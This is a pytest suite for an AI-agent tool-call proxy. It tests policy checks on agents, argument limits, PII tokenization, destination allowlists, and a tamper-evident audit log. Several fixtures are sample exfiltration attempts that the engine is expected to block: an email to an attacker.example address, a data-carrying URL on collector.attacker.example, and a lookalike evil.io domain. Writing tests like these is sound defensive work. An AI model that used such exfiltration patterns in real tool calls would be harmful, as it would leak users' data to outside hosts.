from __future__ import annotations

import json
from pathlib import Path

import pytest
from pydantic import ValidationError

from agent_proxy.audit import GENESIS, AuditLog, record_hash, verify_audit_log, verify_lines
from agent_proxy.models import PIIType
from agent_proxy.pii.vault import TokenVault
from agent_proxy.policy import PolicyEngine, PolicyFile, ToolCall, destination_allowed


def call(name: str, i: int = 0, **args: object) -> ToolCall:
    return ToolCall(id=f"c{i}", name=name, arguments=dict(args))


@pytest.fixture()
def engine(policy: PolicyFile) -> PolicyEngine:
    return PolicyEngine(policy, TokenVault(b"k"))


def test_unknown_agent_and_unlisted_tool_are_denied(engine: PolicyEngine) -> None:
    assert not engine.check_tool_calls("s", "mallory", [call("crm_lookup")])[0].allowed
    decision = engine.check_tool_calls("s", "research-agent", [call("send_email", to="a@example-corp.com")])[0]
    assert not decision.allowed and "allowlist" in decision.reasons[0]


def test_argument_constraints(engine: PolicyEngine) -> None:
    decisions = engine.check_tool_calls("s", "billing-agent", [
        call("issue_refund", 0, amount=4900, currency="EUR"),
        call("issue_refund", 1, amount=20, currency="USD"),
        call("lookup_invoice", 2, invoice_id="ORD-1"),
    ])
    assert "exceeds the limit of 200" in decisions[0].reasons[0]
    assert "not one of" in decisions[1].reasons[0]
    assert "pattern" in decisions[2].reasons[0]


def test_destinations_are_checked_through_tokens(engine: PolicyEngine) -> None:
    vault = engine.vault
    attacker = vault.tokenize("s", PIIType.EMAIL, "audit@attacker.example")
    customer = vault.tokenize("s", PIIType.EMAIL, "giulia@example.com")
    denied, allowed = engine.check_tool_calls("s", "billing-agent", [
        call("send_email", 0, to=attacker, body="hi"),
        call("send_email", 1, to=customer, body="Your refund is on its way"),
    ])
    assert not denied.allowed and "attacker.example" in denied.reasons[0]
    assert allowed.allowed
    assert allowed.execute_arguments == {"to": "giulia@example.com", "body": "Your refund is on its way"}


def test_urls_hidden_in_any_argument_are_exfiltration(engine: PolicyEngine) -> None:
    decision = engine.check_tool_calls("s", "billing-agent", [
        call("send_email", to="ops@example-corp.com", body="see https://collector.attacker.example/?d=1")
    ])[0]
    assert not decision.allowed and "collector.attacker.example" in decision.reasons[0]


def test_session_budget_and_per_response_limit(engine: PolicyEngine) -> None:
    first = engine.check_tool_calls("s", "billing-agent", [call("issue_refund", amount=10, currency="EUR")])[0]
    second = engine.check_tool_calls("s", "billing-agent", [call("issue_refund", amount=10, currency="EUR")])[0]
    other_session = engine.check_tool_calls("t", "billing-agent", [call("issue_refund", amount=10, currency="EUR")])
    assert first.allowed and not second.allowed and other_session[0].allowed
    many = engine.check_tool_calls("u", "billing-agent", [call("lookup_invoice", i, invoice_id="INV-1234")
                                                          for i in range(4)])
    assert [d.allowed for d in many] == [True, True, True, False]


def test_malformed_arguments_are_denied(engine: PolicyEngine) -> None:
    bad = ToolCall.from_openai({"id": "x", "function": {"name": "lookup_invoice", "arguments": "{not json"}})
    assert bad.malformed and not engine.check_tool_calls("s", "billing-agent", [bad])[0].allowed


def test_rehydration_only_with_scope_and_class(engine: PolicyEngine) -> None:
    iban = engine.vault.tokenize("s", PIIType.IBAN, "DE89370400440532013000")
    phone = engine.vault.tokenize("s", PIIType.PHONE, "+39 347 123 4567")
    decision = engine.check_tool_calls("s", "billing-agent", [
        call("send_email", to="ops@example-corp.com", body=f"refund to {iban}, phone {phone}")
    ])[0]
    assert decision.execute_arguments is not None
    body = decision.execute_arguments["body"]
    assert "DE89370400440532013000" in body and phone in body  # IBAN revealed, PHONE is not a billing class
    research = engine.check_tool_calls("s", "research-agent", [call("web_search", q=f"owner of {iban}")])[0]
    assert research.allowed and research.execute_arguments == {"q": f"owner of {iban}"}  # no pii:reveal


def test_authentication_and_relay_rules(engine: PolicyEngine) -> None:
    assert engine.authenticate("billing-agent", "billing-demo-key") is not None
    assert engine.authenticate("billing-agent", "wrong") is None
    assert engine.authenticate("ghost", None) is None
    assert engine.check_relay("research-agent", "billing-agent") == []
    assert engine.check_relay("billing-agent", "research-agent")  # not in can_send_to


def test_destination_wildcards() -> None:
    assert destination_allowed("mail.example-corp.com", ["*.example-corp.com"])
    assert not destination_allowed("example-corp.com.evil.io", ["*.example-corp.com", "example-corp.com"])


def test_policy_validation() -> None:
    with pytest.raises(ValidationError):
        PolicyFile.model_validate({"version": 2})
    with pytest.raises(ValidationError):
        PolicyFile.model_validate({"agents": {"a": {"data_classes": ["SHOE_SIZE"]}}})


# ----------------------------------------------------------------------------------------------- audit


def _filled(path: Path | None = None, key: bytes | None = None) -> AuditLog:
    log = AuditLog(path, key=key)
    for i in range(5):
        log.append("event", actor="a", session="s", n=i)
    return log


def test_chain_verifies_and_links(tmp_path: Path) -> None:
    log = _filled(tmp_path / "audit.jsonl")
    records = log.records()
    assert records[0].prev == GENESIS and all(b.prev == a.hash for a, b in zip(records, records[1:], strict=False))
    assert record_hash(records[2].body()) == records[2].hash
    assert verify_audit_log(tmp_path / "audit.jsonl").ok


def test_reopening_continues_the_chain(tmp_path: Path) -> None:
    path = tmp_path / "audit.jsonl"
    _filled(path)
    AuditLog(path).append("later")
    result = verify_audit_log(path)
    assert result.ok and result.records == 6


@pytest.mark.parametrize("attack", ["edit", "delete", "swap", "insert"])
def test_tampering_is_located(attack: str) -> None:
    lines = _filled().lines()
    if attack == "edit":
        lines[2] = lines[2].replace('"n":2', '"n":9')
    elif attack == "delete":
        del lines[2]
    elif attack == "swap":
        lines[1], lines[2] = lines[2], lines[1]
    else:
        lines.insert(2, lines[1])
    result = verify_lines(lines)
    assert not result.ok and result.records in (1, 2) and result.error_seq in (2, 3, 4)


def test_hmac_stops_a_recomputed_chain() -> None:
    lines = _filled(key=b"secret").lines()
    forged, prev = [], GENESIS
    for line in lines:  # attacker rewrites a record and recomputes every hash, but has no key
        body = json.loads(line)
        body["data"]["n"] = 0
        body["prev"] = prev
        body.pop("hash"), body.pop("mac")
        body["hash"] = prev = record_hash(body)
        body["mac"] = None
        forged.append(json.dumps(body))
    assert verify_lines(forged).ok  # undetectable without a key
    result = verify_lines(forged, key=b"secret")
    assert not result.ok and "HMAC" in (result.error or "")


def test_pinned_head_detects_truncation() -> None:
    log = _filled()
    head = log.head
    assert not verify_lines(log.lines()[:-1], expected_head=head).ok
    assert verify_lines(log.lines(), expected_head=head).ok
